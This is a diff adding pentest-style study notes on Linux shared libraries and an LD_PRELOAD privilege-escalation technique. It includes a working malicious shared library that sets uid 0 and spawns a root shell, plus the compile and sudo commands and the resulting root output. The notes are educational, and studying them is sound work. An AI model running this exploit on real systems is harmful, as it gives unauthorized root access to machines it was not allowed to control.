@@ -2013,3 +2013,73 @@ whoami
 * **Caution:** Kernel exploits can cause system instability — **use caution**, avoid running on production systems.
 
 ---
+
+# 🧠 Shared Libraries in Linux
+
+## 📚 Overview
+- Linux uses **shared object libraries** to avoid redundant code across programs.
+- Two types:
+  - **Static libraries** (`.a`): compiled into the binary, cannot be changed.
+  - **Dynamic libraries** (`.so`): loaded at runtime, can be modified.
+
+## 📍 Library Location Methods
+- Compiler flags: `-rpath`, `-rpath-link`
+- Environment variables: `LD_RUN_PATH`, `LD_LIBRARY_PATH`
+- Default directories: `/lib`, `/usr/lib`
+- Config file: `/etc/ld.so.conf`
+
+## 🔍 Viewing Linked Libraries
+Use `ldd` to list shared libraries used by a binary:
+```bash
+ldd /bin/ls
+```
+
+## ⚠️ LD_PRELOAD Environment Variable
+- Allows preloading a custom `.so` library before executing a binary.
+- Overrides default functions with those in the specified library.
+
+---
+
+# 🚨 LD_PRELOAD Privilege Escalation Example
+
+## 🧑‍💻 Sudo Permissions
+```bash
+sudo -l
+```
+- User `daniel.carter` can run `/usr/sbin/apache2 restart` as root without a password.
+- `env_keep+=LD_PRELOAD` allows LD_PRELOAD to persist in sudo environment.
+
+## 🛠️ Malicious Library Code
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+  unsetenv("LD_PRELOAD");
+  setgid(0);
+  setuid(0);
+  system("/bin/bash");
+}
+```
+
+## 🧪 Compile the Library
+```bash
+gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
+```
+
+## 🚀 Exploit with LD_PRELOAD
+```bash
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+
+## ✅ Result
+```bash
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+> This technique leverages LD_PRELOAD to gain root shell access by injecting a custom shared library.
+
+---
